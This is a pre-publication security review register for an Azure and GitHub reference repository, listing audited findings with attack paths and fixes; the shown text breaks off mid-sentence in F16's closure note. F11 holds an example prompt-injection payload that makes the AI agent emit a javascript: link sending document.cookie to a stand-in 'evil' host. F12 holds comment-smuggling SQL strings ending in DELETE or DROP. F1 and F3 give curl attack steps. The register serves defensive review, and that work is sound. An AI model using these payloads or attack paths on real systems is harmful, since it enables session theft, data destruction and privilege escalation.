# Pre-publication security review — 2026-08-26

Four auditors reviewed this repo ahead of publication: appsec, infra, supply-chain, and
NIST 800-171. Every claim below was independently re-verified by the controller before
acceptance — reproduced where marked, traced end to end where marked, or confirmed by
direct inspection otherwise. Fifteen findings resulted. This document is the durable
record of them; before it existed, they lived only in a chat transcript.

**F16–F18 addendum (same day):** a second scrub applied two lenses the 800-171 pass did
not — the NIST SP 800-53 Rev 5 moderate-baseline families 800-171 tailors *out* (CM-6,
SI-4, CP-9, IR-4, CP-10) and CMMC 2.0 Level 1's FAR 52.204-21 basic safeguards — against
four candidates the first pass surfaced but never ran down. Three confirmed as real gaps
(F16–F18, below); one (`Standard_LRS` on the cost-export storage account) was checked and
dismissed — see "Deliberately NOT findings."

**Status for every finding below is GAP.** Nothing on this list has been fixed. Each
finding's `Fix:` describes what closing it requires, not what has been done. The
per-control assessment records in `compliance/assessment/*.json` cite this document as
their evidence and carry the same status.

## Index

| # | Finding | Severity | Confidence | Controls | Closed by |
|---|---|---|---|---|---|
| [F1](#f1) | data-api: public internet, zero inbound auth | critical | CONFIRMED | 3.1.1, 3.1.2, 3.13.1 | Task 6 |
| [F2](#f2) | MCP auth gate inert in the shipped configuration | critical | CONFIRMED | 3.1.1, 3.5.1, 3.13.1 | Tasks 4, 5 |
| [F3](#f3) | Direct Line token endpoint fails open twice | high | CONFIRMED | 3.1.1, 3.5.1 | Task 7 |
| [F4](#f4) | App Insights key + subscription inventory in a public job summary | high | CONFIRMED | 3.1.3, 3.13.16 | Task 8 |
| [F5](#f5) | lint-ci node leg dead — npm test never runs in CI | high | CONFIRMED (reproduced) | 3.12.3, 3.14.1 | Task 3 |
| [F6](#f6) | mls-verifier has no federated credential | high | CONFIRMED | 3.12.1, 3.12.3 | Task 9 |
| [F7](#f7) | `environment: demo` mints an Owner-capable OIDC subject | high | CONFIRMED | 3.1.5, 3.1.6, 3.1.7 | Task 9 |
| [F8](#f8) | Application.ReadWrite.All on the deployer | high | CONFIRMED | 3.1.5 | Task 10 |
| [F9](#f9) | Zero diagnosticSettings anywhere in the estate | high | CONFIRMED | 3.3.1, 3.3.2, 3.3.5 | Task 13 |
| [F10](#f10) | NIST policy identity holds standing Contributor | medium | CONFIRMED | 3.1.5 | Task 11 |
| [F11](#f11) | `javascript:` href accepted in Adaptive Cards; no CSP | high | CONFIRMED (path traced end to end) | 3.14.1 | Task 14 |
| [F12](#f12) | SQL gate: unterminated comment/quote swallows the tail | medium | CONFIRMED (reproduced) | 3.14.1 | Task 15 |
| [F13](#f13) | Zero workload RBAC expressed in IaC | high | CONFIRMED | 3.1.1, 3.1.2, 3.1.5 | Task 12 |
| [F14](#f14) | self-heal branch-squatting kill switch + missing ref filter | medium | CONFIRMED | — (availability) | Task 16 |
| [F15](#f15) | Cost export non-functional | medium | CONFIRMED | — (cost control) | Task 17 |
| [F16](#f16) | Azure SQL backup posture never decided or verified | medium | CONFIRMED | CP-9 | Task 18 |
| [F17](#f17) | Zero alert rules or action groups anywhere in the estate | high | CONFIRMED | SI-4, IR-4 | Task 19 |
| [F18](#f18) | Sensitivity labels published nowhere — a taxonomy, not a control | medium | CONFIRMED | CM-6 | Task 20 |
| [F19](#f19) | cost-ingest documented as deployed; deploys nowhere | medium | CONFIRMED | — (availability/completeness) | *deferred to sponsor — needs a Function App (new deploy surface + a G2 spend decision)* |
| [F20](#f20) | data-api's contained-user grant is expressed but never applies | medium | CONFIRMED | — (availability) | Task 22 |
| [F21](#f21) | mls-verifier's documented Fabric workspace Viewer grant does not exist | high | CONFIRMED | — (availability — breaks the Verifier's sign-off gate) | Task 21 |
| [F22](#f22) | Container images never smoke-tested in CI | medium | CONFIRMED | — (availability) | Task 24 |
| [F23](#f23) | Three G3 full-tenant teardown scripts the runbooks instruct operators to run did not exist | high | CONFIRMED | CM-6 | Task 25 |

F19–F21 were surfaced building Task 12 (F13's closing task), same day as the rest of this register. All three are the same shape as F2 and F18 — a document asserting something the code never does — but none is a CUI-protection gap the way F1–F13 are, so none maps to an 800-171 control; they are recorded here for the same reason F14/F15 (which also map to no control) are tracked in this document rather than falling through the gap between the security and compliance framings. F22 was surfaced by the Task 14 review and is the same class as F5 — a CI gap meaning something is never actually exercised, not a document mismatch — but it likewise maps to no 800-171 control, so it is tracked here for the same reason. F23 was surfaced by the Task 20 review and generalised by a repo-wide teardown census; unlike F19–F22 it DOES map to a control (CM-6, the same one F18 maps to) and it is the only finding in this register that also violates a CLAUDE.md hard rule directly (the deploy/teardown/audit triplet).

---

## F1

**data-api: public internet, zero inbound auth**

- **Severity:** critical
- **Confidence:** CONFIRMED
- **Controls:** 3.1.1, 3.1.2, 3.13.1
- **Closed by:** Task 6
- **Status:** GAP

**Where:** `apps/data-api/src/app.ts:56` ("there is deliberately no Authorization here");
`app.ts:67-169` (middleware chain — requestId, securityHeaders, cors, requestSpan,
readOnlyGuard, no auth layer); `infra/bicep/apps/main.bicep:334` (`ingressExternal: true`).

**Attack path:** read the FQDN from the layer-07 public job summary, or proxy through
control-tower's nginx `/api/*`. Then `GET /feeds/secure-score` (live Defender posture),
`/feeds/dependabot-alerts` (not public even on a public repo), `/feeds/app-requests` (Log
Analytics results). Then loop `curl ".../tables/launches?limit=10000"`.

**Impact:** unauthenticated disclosure of tenant security posture, plus the worst cost
path in the estate. Each request wakes the app AND touches `GP_S_Gen5` serverless SQL with
`autoPauseDelay: 60`. One request every 59 minutes from anywhere holds it online at min 0.5
vCore, about $0.26/hr or $188/month. No flood needed. `maxReplicas: 2` caps ACA, not
upstreams.

**Note:** CORS is correctly NOT treated as authorization — `app.ts:199` calls that
"security theatre", which is right about CORS. Nothing replaced it.

**Fix:** `ingressExternal: false`; both frontends already proxy `/api/` server-side.

---

## F2

**MCP auth gate inert in the shipped configuration**

- **Severity:** critical
- **Confidence:** CONFIRMED
- **Controls:** 3.1.1, 3.5.1, 3.13.1
- **Closed by:** Tasks 4, 5
- **Status:** GAP

**Where:** `apps/mcp-tools/src/auth-gate.ts:123-147` (throws only when
`backendMode === 'cloud'`); `config.ts:156` (`env.MLS_TOOL_BACKENDS ?? "local"`);
`infra/bicep/apps/main.bicep` (mcpToolsApp sets three env vars; `MLS_TOOL_BACKENDS` is set
NOWHERE in `infra/` or `.github/`); `demo.bicepparam` (`mcpAuthToken` defaults to empty).

**Attack path:** FQDN plus `POST /mcp` with a JSON-RPC `tools/call`, no credential.

**Impact:** today the local adapters serve fixtures so disclosure is nil — but the control
the repo advertises most prominently reads as present and is not, and a later cloud switch
inherits `enforced: false`. `/healthz` publishes `auth: { enforced: false }` to anyone. The
boot banner prints the REASSURING branch ("local mode; set MCP_AUTH_TOKEN") because the
loud warning is reachable only via `deliberatelyOpen`.

**Also:** `grep -rn MCP_AUTH_TOKEN .github/` returns nothing — the Key Vault to workflow to
deploy chain asserted by `demo.bicepparam`'s comment and g0-bootstrap.md C11 does not
exist.

**Fix:** enforce unless explicitly opted out (invert the default); set
`MLS_TOOL_BACKENDS` explicitly; resolve the token via `keyVaultUrl` + UAMI, not a secure
param.

---

## F3

**Direct Line token endpoint: unauthenticated faucet, fails open twice**

- **Severity:** high
- **Confidence:** CONFIRMED
- **Controls:** 3.1.1, 3.5.1
- **Closed by:** Task 7
- **Status:** GAP

**Where:** `apps/directline-token/src/functions/directline-token.mjs:60-67`, `:94-99`:
`if (allowed.length > 0 && origin && !allowed.includes(origin)) return 403`

Two fail-open conditions in one line:
1. No `Origin` header → `origin` undefined → guard skipped → token minted. Browsers always
   send it on cross-origin POST; curl never has to.
2. `DIRECTLINE_ALLOWED_ORIGINS` unset → `allowed.length === 0` → guard skipped AND
   `trustedOrigins` passed as undefined to `exchangeSecretForToken` (line 74), so the
   minted token carries no origin binding either. No boot-time check that the variable is
   set.

**Attack path:** `curl -X POST .../api/directline/token` with no Origin returns 200 and a
valid token. Open a conversation, loop questions. Each turn runs the agent, which calls
the MCP tools, which hit Fabric SQL, Log Analytics, ARM Cost Management and the GitHub
Security API.

**Critical:** **this path holds the MCP token**, so F2's gate is irrelevant to it — the
attacker never needs one. Compounding wallet drain across Copilot Studio credits and
Fabric CU.

**Note:** the header comment cites "Functions platform rate limiting" as a control;
`host.json` configures no throttling and `authLevel` is `"anonymous"`.

**Fix:** refuse when `allowed.length === 0` (500, not configured); refuse when `!origin`
(403).

---

## F4

**App Insights ingestion key and subscription inventory in a public job summary**

- **Severity:** high
- **Confidence:** CONFIRMED
- **Controls:** 3.1.3, 3.13.16
- **Closed by:** Task 8
- **Status:** GAP

**Where:** `infra/bicep/platform/main.bicep:344` (`output appInsightsConnectionString`,
annotated "not a secret"); `.github/workflows/layer-06-platform.yml:192-197`
(`cat l6-manifest.json >> $GITHUB_STEP_SUMMARY`) and `:299-304` (artifact upload).
`layer-07-apps.yml` does the same with `l7-manifest.json`.

**Key fact:** job summaries and artifacts on a PUBLIC repo are readable without
authentication. The string carries `InstrumentationKey=<guid>`, and AVM
`insights/component@0.8.0` defaults `disableLocalAuth: false` (`main.bicep:175-185` does
not override) — that key alone authorises telemetry ingestion from anywhere on the
internet.

**Impact, integrity:** an attacker injects arbitrary traces, exceptions and metrics into
the workspace backing control-tower's Dev/Sec/Ops tabs. The security dashboard becomes
attacker-writable, and it corrupts the estate's only audit trail.

**Impact, disclosure:** the same manifest publishes `keyVaultUri`, `sqlServerFqdn`,
`costExportStorageResourceId`, `lawCustomerId` and — inside every resource ID — the
SUBSCRIPTION ID, which CLAUDE.md hard rule 5 says lives in GitHub environment variables
and is never committed.

**Bounded by:** `lawDailyQuotaGb: '1'` (`platform/main.bicep:95`), capping ingestion at
about $2.50/day.

**Fix:** delete the output — nothing consumes it, `apps/main.bicep:218-221` reads the
component as `existing`; set `disableLocalAuth: true` and grant the two UAMIs Monitoring
Metrics Publisher; summarise selected keys instead of `cat`-ing the manifest; drop the
artifact upload.

---

## F5

**lint-ci node leg dead: npm test never runs in CI**

- **Severity:** high
- **Confidence:** CONFIRMED (reproduced)
- **Controls:** 3.12.3, 3.14.1
- **Closed by:** Task 3
- **Status:** GAP

**Where:** `.github/workflows/lint-ci.yml:196-202` —
`for script in .github/scripts/*.mjs; do node --check "${script}"; done` under
`set -euo pipefail`. `.github/scripts/` was DELETED by the 2026-08-24 amendment
(`.github/README.md:135` says so).

**Reproduced:** no `nullglob`, so bash passes the literal glob, `node --check` exits 1,
and `set -e` kills the step. "LOOP COMPLETED" never prints.

**Impact:** it is the FIRST step of the node job, so `npm ci`, `npm run build`,
`npm run typecheck`, `npm test` across 7 workspaces, and the vuln-lab CVE-seed integrity
check (`:216-234`) never run. The JS/TS test gate is absent, not merely failing.

**Live risk:** required checks are about to be chosen "after the first CI run", so a
permanently-red job gets left off the list, removing `npm test` from the auto-merge
gauntlet permanently.

**Fix:** delete the step. Do NOT "fix" it with `nullglob` — a step that silently checks
nothing is worse than no step.

---

## F6

**mls-verifier has no federated credential**

- **Severity:** high
- **Confidence:** CONFIRMED
- **Controls:** 3.12.1, 3.12.3
- **Closed by:** Task 9
- **Status:** GAP

**Where:** `scripts/bootstrap/01-root-oidc.ps1` — `Initialize-FederatedCredential` is
called exactly twice, `:352` and `:354`, BOTH with `$deployer.id`. The verifier block
(`:372-382`) creates the app, SP, Reader role and Graph roles, and no credential. Nothing
else in the repo creates one.

**Impact:** every `azure/login` with `AZURE_VERIFIER_CLIENT_ID` fails `AADSTS70021`. Every
layer's verify job fails at login. `verify-g0.ps1:203-209` (`Test-VerifierApp`) only
checks the app REGISTRATION exists, so G0 reports green on a verifier that cannot
authenticate. CLAUDE.md's core control — "a layer is DONE only on the Verifier's
sign-off, running as mls-verifier (Reader), never as the deployer SP" — is
unimplementable as shipped.

**Fix:** create the FIC with a subject DISTINCT from the deployer's; extend
`Test-VerifierApp` to assert both the credential and the distinctness.

---

## F7

**`environment: demo` mints an Owner-capable OIDC subject**

- **Severity:** high
- **Confidence:** CONFIRMED
- **Controls:** 3.1.5, 3.1.6, 3.1.7
- **Closed by:** Task 9
- **Status:** GAP

**Where:** `01-root-oidc.ps1:354-355` federates `repo:<r>:environment:demo` to the
deployer; `:358` grants that deployer OWNER on the subscription. `verify-l1.yml:69-72`
declares `environment: demo` AND `id-token: write` while intending to run as the
Reader-scoped verifier. Same shape at `self-heal.yml:683` and `layer-07-apps.yml:336`.

**Key mechanism:** the OIDC subject derives from the JOB'S environment name, NOT from the
`client-id` passed to `azure/login`.

**Attack path:** anything executing in a verify job — a compromised action, a malicious
transitive dependency pulled by the `npm ci` those jobs run, a tampered audit script —
reads `ACTIONS_ID_TOKEN_REQUEST_URL`/`_TOKEN` (job-scoped, present for the whole job),
mints a token with subject `environment:demo`, and exchanges it against
`mls-github-deployer`. Reader to Owner in three HTTP calls. The deployer's consented Graph
roles then give tenant-wide identity write.

**Compounding:** the demo environment is created with a bare
`gh api -X PUT .../environments/demo` (g0-bootstrap.md, `L01.md:41`) — no
deployment-branch policy, no required reviewers. So `environment:demo` is mintable from
ANY ref, not just main. `L01.md:155` asserts the subject "pins deploys to the demo
environment's protection rules"; there are none.

**Fix:** a second environment (`verify`) federated to mls-verifier; verify jobs move to
it; deployment-branch policy on both restricting to main; assert it in `verify-g0.ps1`.

---

## F8

**Application.ReadWrite.All on the deployer**

- **Severity:** high
- **Confidence:** CONFIRMED
- **Controls:** 3.1.5
- **Closed by:** Task 10
- **Status:** GAP

**Where:** `scripts/bootstrap/01-root-oidc.ps1:69`.

**Why it matters more than Owner:** it permits adding a client secret or certificate to
ANY application or service principal in the tenant, including one holding Global
Administrator or `RoleManagement.ReadWrite.Directory`. Repo compromise therefore escalates
to full TENANT compromise — strictly larger than Owner on one subscription.

**Actual usage:** `infra/entra/apply-entra.ps1:415` only creates and updates the three
apps in `manifest.json`, all owned by the deployer.

**Fix:** `Application.ReadWrite.OwnedBy` (`18a4783c-866b-4cc7-a460-3d5e5662c884`), a
drop-in. Note in passing: `Policy.ReadWrite.ConditionalAccess` can disable CA
tenant-wide; retained deliberately because L3 needs it, but it belongs in the risk
register.

---

## F9

**Zero diagnosticSettings anywhere in the estate**

- **Severity:** high
- **Confidence:** CONFIRMED
- **Controls:** 3.3.1, 3.3.2, 3.3.5
- **Closed by:** Task 13
- **Status:** GAP

**Verified:** grep for `diagnosticSettings|auditingSettings|az monitor diagnostic` across
all Bicep, YAML and PowerShell returns ZERO matches.

**Missing:** Key Vault `AuditEvent` — the estate's only real credentials, the Direct Line
secret and mcp-auth-token, with access entirely unlogged. SQL audit — AVM
`sql/server@0.22.0` defaults `auditSettings { state: 'Enabled' }` with NEITHER
`storageAccountResourceId` NOR `isAzureMonitorTargetEnabled`, and `platform/main.bicep:236-285`
does not override, so auditing is nominally on and writes nowhere (and may hard-fail the
L6 deployment). Also missing: storage blob data-plane logs, Container Apps environment
diagnostics, subscription Activity Log, Entra SignInLogs and AuditLogs.

**Also:** `lawDataRetentionDays` is 30 (`platform/main.bicep:91-93`) against the 90-day
convention AU-11 is assessed at, and DFARS 252.204-7012(e)'s 90-day preservation
obligation.

**Impact:** collapses three NIST families at once — 3.3 outright, 3.6 detection,
3.14.6/.7 — because you cannot alert on data you never collect. Cheapest item on the list
to fix.

**Fix:** `diagnosticSettings` on Key Vault, storage, SQL server and the CAE routed to the
LAW; SQL `auditSettings` with `isAzureMonitorTargetEnabled: true`; Activity Log and Entra
diagnostics via the L2/L3 workflows; retention 30 to 90. `dailyQuotaGb: '1'` already
bounds the cost.

---

## F10

**NIST policy identity holds standing Contributor it can never use**

- **Severity:** medium
- **Confidence:** CONFIRMED
- **Controls:** 3.1.5
- **Closed by:** Task 11
- **Status:** GAP

**Where:** `infra/bicep/landing-zone/main.bicep:225` (`enforcementMode: 'DoNotEnforce'`)
and `:228` (`roleDefinitionIds: [contributorRoleId]` with `identity: 'SystemAssigned'`).

**Fact:** ARM requires an IDENTITY when an initiative contains
`deployIfNotExists`/`modify` members. It does NOT require any role assignment. In
`DoNotEnforce` no remediation ever runs, so the identity has nothing to do with the
Contributor grant it holds.

**Impact:** a permanent subscription-scoped Contributor principal nobody owns or
monitors, reachable by anyone who can create a remediation task, surviving RG-scoped
teardown because the assignment lives at subscription scope.

**Fix:** `roleDefinitionIds: []`. The identity is still created and the assignment
validates.

---

## F11

**`javascript:` href accepted in Adaptive Cards; no CSP**

- **Severity:** high
- **Confidence:** CONFIRMED (path traced end to end)
- **Controls:** 3.14.1
- **Closed by:** Task 14
- **Status:** GAP

**Where:** `apps/control-tower/src/AdaptiveCardView.tsx:194-202` (Action.OpenUrl) and
`:123-127` (Image). `str()` at `:60` checks only "non-empty string".

**Chain verified:** Fluent's `useLinkBase_unstable` passes `href` straight to `<a>` with
NO scheme sanitization (`useLinkState` only blanks it when disabled); React `^18.3.1`
renders `javascript:` with a dev-only warning, it does not block; control-tower's
`nginx.conf.template` emits NO Content-Security-Policy, so `script-src 'self'` — which
would neutralise a `javascript:` URI — is absent.

**Source of the card:** the Copilot Studio agent over Direct Line, handed to the renderer
verbatim (`agent/transcript.ts:44-50` casts `attachment.content` to `AdaptiveCard` with no
validation).

**Attack path:** prompt-inject the agent into emitting
`{"type":"Action.OpenUrl","title":"View report","url":"javascript:fetch('https://evil/'+document.cookie)"}`.
An operator clicks a plausible-looking button and script executes in control-tower's
origin, where the live Direct Line token is in JS memory and the same-origin `/api/*`
proxy to data-api is reachable.

**The tell:** the sibling renderer already does this correctly —
`apps/shared/spec-renderer/src/markdown.tsx:14` constrains hrefs to `https?://` in the
tokenizer. The Adaptive Card path never got the same treatment.

`Image.url` has the same gap. `javascript:` does not execute in `img src`, so that one is
an outbound beacon / exfiltration channel rather than XSS.

**Also:** `apps/control-tower/Dockerfile:24` and `apps/launch-ops/Dockerfile:24` have NO
`USER` directive — both nginx frontends run as root. `data-api:73` and `mcp-tools:45`
correctly drop to `USER node`. Looks like oversight.

**Fix:** an `/^https?:\/\//i` guard on both `Action.OpenUrl.url` and `Image.url`; CSP,
nosniff and Referrer-Policy on both nginx templates; `USER nginx` on both frontend
Dockerfiles.

---

## F12

**SQL gate: unterminated comment or quote swallows the tail**

- **Severity:** medium
- **Confidence:** CONFIRMED (reproduced against the real gate)
- **Controls:** 3.14.1
- **Closed by:** Task 15
- **Status:** GAP

**Where:** `apps/mcp-tools/src/tools/sql-dialect.ts:154-166` (nesting), `:229-265` (all
three checks run on the SCRUBBED text), `:267` (returns the RAW text).

**Root cause:** the comment at `:154` claims nesting "cannot under-scrub either dialect".
True for T-SQL, which nests. SQLite does NOT nest, so `/* a /* b */` is a CLOSED comment
to SQLite and an UNCLOSED one to `scrubSql`, which then eats the rest of the input.

**Reproduced by the controller:**
- `SELECT 1 /* a /* b */ ; DELETE FROM launches` — PASSES the gate, both sqlite and tsql
- ``SELECT 1 ` ; DROP TABLE launches`` — PASSES the gate, sqlite
- The scrubbed text the checks saw was `"SELECT 1  "`. Both the semicolon scan and the
  forbidden-verb scan are blind to everything after the fake opener. The same trick works
  with an unterminated `'`, `[` or `"`.

**Not exploitable today, verified rather than assumed:** `queryLakehouse` uses
`db.prepare()`, which compiles only the first statement — run against a live sql.js
database, the hidden DELETE did not run. sql.js is built without `load_extension`. T-SQL
nests identically, so the region is genuinely a comment there.

**Why it still matters:** the safety property is `db.prepare`'s single-statement
compilation, NOT the gate. That is incidental, and one refactor from being lost —
`lakehouse.ts` already uses `db.run`/`db.exec` three lines up (118, 122, 134), and
`db.exec("SELECT 1; DELETE FROM launches")` DOES execute both (verified: row count went
to 0). For a published reference implementation, a gate that hands `; DELETE FROM
launches` to the engine and calls itself a single-statement gate is the wrong thing to
model.

**Fix:** `scrubSql` returns a structural-validity flag; reject any statement ending with
an unclosed comment, quote, backtick or bracket. Make nesting dialect-aware.

---

## F13

**Zero workload RBAC expressed in IaC**

- **Severity:** high
- **Confidence:** CONFIRMED
- **Controls:** 3.1.1, 3.1.2, 3.1.5
- **Closed by:** Task 12
- **Status:** GAP

**Verified:** ZERO `az role assignment` invocations across `.github/`, `scripts/`,
`infra/`, `data/`. ZERO `roleAssignments:` parameters to any AVM module. The ONLY
`Microsoft.Authorization/roleAssignments` resource in the tree is
`infra/bicep/apps/modules/key-vault-secrets-user-role.bicep` — documented as
UNREFERENCED in three places (`apps/main.bicep:111`, `infra/bicep/README.md:24` and
`:178`) and whose own header says it exists "needed by copilot-svc to resolve its
ANTHROPIC_API_KEY secret reference". `copilot-svc` was deleted by the 2026-08-24
amendment; no Anthropic key exists.

**The only grants that exist:** deployer to Owner, verifier to Reader, both in
PowerShell at subscription scope. So privilege is INVERTED — maximum where automated,
undefined where documented.

**Seven grants documented in prose and implemented nowhere:**

| Principal | Grant | Documented at |
|---|---|---|
| data-api | SQL contained-database user | `apps/main.bicep:637` |
| data-api | Fabric workspace Viewer | `apps/main.bicep:637` |
| data-api, mcp-tools | Log Analytics Reader | `apps/main.bicep:637`, `tools/cloud/log-analytics.ts:14` |
| data-api, mcp-tools | Security Reader | `apps/main.bicep:637`, `tools/cloud/defender-posture.ts:18` |
| mcp-tools | Cost Management Reader | `apps/main.bicep:101`, `tools/auth.ts:92` |
| Cost Management service | Storage Blob Data Contributor | `platform/main.bicep:301` |
| cost-ingest | Storage Blob Data Reader | `apps/cost-ingest/README.md:143` |

**NOT just compliance — a dated failure.** `apps/main.bicep:263`:
`var dataApiMode = empty(dataApiBackendMode) ? (empty(fabricSqlEndpoint) ? 'local' : 'cloud') : dataApiBackendMode`
flips data-api to CLOUD as soon as `fabricSqlEndpoint` is set, which G0 item C9 has you
do after L5. At that moment data-api 403s on every backend call. Lands days 7-14 of the
30-day window, presenting as a mysterious runtime failure rather than a configuration
error.

**Also** breaks the repo's own first principle — "no manual portal configuration outside
G0" (`docs/BRIEF.md:95-97`) — at the authorization layer, the worst place for an
unwritten step.

**Fix:** express all seven in IaC; add a V7.x criterion asserting each principal holds
exactly its expected roles and no others; delete or repurpose
`key-vault-secrets-user-role.bicep`.

---

## F14

**self-heal branch-squatting kill switch and missing ref filter**

- **Severity:** medium
- **Confidence:** CONFIRMED
- **Controls:** none — no 800-171 control (availability)
- **Closed by:** Task 16
- **Status:** CLOSED

**Where:** `.github/workflows/self-heal.yml:252` —
`gh pr list --state open --json headRefName --jq '.[].headRefName' > open-branches.txt`,
then `:255-259` skips any alert whose number appears in a `self-heal/<kind>-<n>-` branch
name.

**Attack path:** `gh pr list` enumerates ALL open PRs including forks, and the attacker
controls their own head-branch name. Once public, open 50 throwaway fork PRs named
`self-heal/dependabot-1-x` through `-50-x`. Every alert now looks handled, `:261` sets
`found=false`, and the run reports "Nothing to heal" and concludes GREEN. Alert numbers
are small sequential integers, so no reconnaissance is needed. Works on code-scanning
too.

**Impact:** an outsider gets a SILENT kill switch for the demo's centrepiece, and
V10.1/V10.2 fail their 24-hour window with no error anyone will notice — the workflow
reports success.

**Separately,** `:242`: `repos/{r}/code-scanning/alerts?state=open` has no `ref=` filter,
so alerts raised on fork-PR CodeQL analyses (`codeql.yml:23-24` runs on `pull_request`)
are in scope.

**Fix:** scope the PR list to `headRepositoryOwner.login ==` the base repo owner, or use
`git/matching-refs/heads/self-heal/`; add `ref=refs/heads/main` to the alerts endpoint
and assert `most_recent_instance.ref` before proceeding.

**Note:** this finding maps to no NIST SP 800-171 control — it is an availability
finding against the self-healing pipeline's own integrity, not a CUI-protection gap. It
is tracked here, and in the findings table, so it does not fall through the gap between
the security and compliance framings.

**Closed (Task 16):** the branch-squat check now asks
`gh api repos/${REPO}/git/matching-refs/heads/self-heal/`, scoped to the base
repository's own ref namespace rather than filtering `gh pr list`'s fork-visible
results — a fork's branch lives in the fork's own namespace and can never appear
there, which sidesteps the fork question rather than filtering for it, and needs
only `contents: read` (verified empirically against a real public repo: zero
matches returns HTTP 200 with `[]`, never a 404, so a clean repo with no open
self-heal branches yet still heals correctly). The code-scanning alert listing
now carries `ref=refs/heads/<default_branch>` (resolved dynamically, not
hardcoded), and `.most_recent_instance.ref` is re-checked directly against that
target in two independent places: inside the `select` job's own listing filter,
and again as the first step of the `autofix` job — the latter because an alert
number can also arrive via `workflow_dispatch`/`repository_dispatch`, which
bypasses the `select` job's listing (and its `ref=` filter) entirely.
`verification/tests/self-heal-selection.Tests.ps1` is a workflow-shape regression
guard for both changes; it fails against the pre-fix file and passes against the
fixed one. F14 maps to no control, so unlike a finding with an 800-171 mapping
there is no `compliance/assessment/*.json` to update — this Status field and the
plan's Task 16 outcome note are F14's only closure record, same as F15's will be.

---

## F15

**Cost export non-functional; the backstop behind every wallet finding**

- **Severity:** medium
- **Confidence:** CONFIRMED
- **Controls:** none — no 800-171 control (cost control)
- **Closed by:** Task 17
- **Status:** CLOSED

Three defects:

1. **Container name mismatch.** `infra/bicep/platform/main.bicep:309` creates
   `cost-exports` ("container name pinned by the L6 audit (V6.3)");
   `layer-06-platform.yml:232` writes to `--storage-container costexports`. Different
   container.
2. **No data-plane grant.** `allowSharedKeyAccess: false` (`platform/main.bicep:304`)
   forces the RBAC write path, and the comment at `:300-303` says the layer-06 workflow
   grants Storage Blob Data Contributor to the Cost Management service identity.
   `grep -rn "az role assignment create" .github/ scripts/` returns no non-test hits. The
   grant does not exist; the export cannot write.
3. **The budget alone is thin.** `scripts/bootstrap/03-budget.ps1` sets $75/month with
   notifications at 50/80/100%, ALL `thresholdType 'Actual'` (`:127`), email-only, no
   action group. Cost Management actual-cost data lags 8-24 hours. A Friday-evening flood
   against the unauthenticated data-api burns the credit before the first email arrives.

**Fix:** align the container name; add the Storage Blob Data Contributor grant; add
`Forecasted` notifications at 50% and 80% alongside the actual ones.

**Note:** this finding maps to no NIST SP 800-171 control — it is a cost-control finding,
not a CUI-protection gap. It is tracked here, and in the findings table, so it does not
fall through the gap between the security and compliance framings.

**Closed (Task 17):** all three defects fixed. (1) `layer-06-platform.yml` now writes to
`cost-exports`, matching `infra/bicep/platform/main.bicep` and the V6.3 audit's default
container name — one container, not two. (2) The grant is real and targets a real
identity: `az costmanagement export create`/`update` has no `--identity-type` flag, and
the costmanagement CLI extension pins API version 2020-06-01, which hard-requires the
destination storage account's shared keys to be enabled
(github.com/Azure/azure-cli/issues/32912) — it would 400 outright against this account's
`allowSharedKeyAccess: false`, so the Bicep comment's claim was unreachable as written,
not merely unimplemented. The fix creates the export via `az rest` against the Exports
REST API directly (api-version 2023-08-01), which supports both RBAC-only storage and an
explicit `identity: { type: SystemAssigned }` request in the PUT body; the response
returns that identity's `principalId` synchronously, and the workflow grants it Storage
Blob Data Contributor — scoped to the `cost-exports` container, not the whole account —
via an idempotent `az role assignment create` keyed on the `principalId` (never a
resourceId or clientId, the same caution Task 12 left behind). (3) `Forecasted`
notifications at 50% and 80% now run alongside the existing `Actual` ones at 50/80/100%
in `scripts/bootstrap/03-budget.ps1` — additive, not a replacement, since Actual is still
the ground truth once its 8-24h lag clears.
`scripts/bootstrap/tests/03-budget.Tests.ps1` is a regression guard for the third fix; it
fails against the pre-fix script (every notification `Actual`) and passes against the
fixed one. F13's table entry for "Cost Management service -> Storage Blob Data
Contributor" is correspondingly DONE; F13 itself stays OPEN on F19 alone (see
`compliance/assessment/3.1.1.json`, `3.1.2.json`, `3.1.5.json`).

---

## F16

**Azure SQL backup posture never decided or verified**

- **Severity:** medium
- **Confidence:** CONFIRMED
- **Controls:** CP-9 (NIST SP 800-53 Rev 5 — tailored out of 800-171, still probed by
  CMMC assessors)
- **Closed by:** Task 18
- **Status:** CLOSED

**Where:** `infra/bicep/platform/main.bicep:236-285` (`module sqlServer`), specifically
the `databases` array at `:264-282`. No `shortTermRetentionPolicy`,
`longTermRetentionPolicy`, or `requestedBackupStorageRedundancy` property is set on the
server or the database. `verification/layer-06-audit.ps1` (V6.1–V6.4) checks SKU,
auto-pause delay, min/max capacity, LAW connectivity and cost-export presence
field-for-field (`:113-114`), but no criterion anywhere in that file reads backup
configuration.

**Confirmed absent, not merely undocumented:** grep for
`shortTermRetention|longTermRetention|requestedBackupStorageRedundancy|backupStorageRedundancy`
across `infra/` and `verification/` returns zero matches.

**Impact:** Azure SQL always takes automated backups even when a template asks for
nothing — but the retention window and the backup storage redundancy tier are
consequently whatever the platform default resolves to on a given deployment day, not a
decision this repo made, documented, or checks. Every other SQL property that matters to
the master plan is pinned and audited field-for-field (`sqlAutoPauseDelayMinutes`,
`sqlMinCapacity`, `sqlMaxCapacity` all have a V6.1 criterion asserting the exact value);
backup posture is the one property nobody looked at. An adopter who copies this template
for a system that does hold CUI inherits an undecided retention window and an undecided
cross-region replication footprint for backup data — the latter would also quietly widen
the single-region residency boundary the `allowedLocations` policy
(`infra/bicep/landing-zone/main.bicep:181-211`) otherwise pins for live resources.

**Fix:** set `requestedBackupStorageRedundancy` and a `shortTermRetentionPolicy`
(retention days) explicitly on the `databases` array entry, matching the redundancy tier
appropriate to the data classification in play; add a V6.x criterion asserting the values
so a future change is caught rather than silently defaulted.

**Closed (Task 18):** the brief's own property name was wrong for this AVM module
version — `avm/res/sql/server@0.22.0` rejects `shortTermRetentionPolicy` (confirmed via
`az bicep build`, which names the real property in its BCP037 permissible-properties
list); the correct property is `backupShortTermRetentionPolicy`. `requestedBackupStorageRedundancy`
was named correctly as-is. `platform/main.bicep`'s `databases` array entry now sets
`backupShortTermRetentionPolicy: { retentionDays: sqlBackupRetentionDays }` (default 7)
and `requestedBackupStorageRedundancy: sqlBackupStorageRedundancy` (default `'Local'`,
matching the single-region design the `allowedLocations` policy otherwise pins — `Geo`/
`GeoZone` would replicate backup data cross-region without a corresponding decision to do
so). Both are now-explicit template parameters, restated in `demo.bicepparam` next to the
existing spend-profile block. No `backupLongTermRetentionPolicy` is set: the database
holds seeded synthetic data with a deterministic regenerator (`data/seed/`), not data an
LTR vault needs to protect, so adding one was out of this finding's scope — an adopter
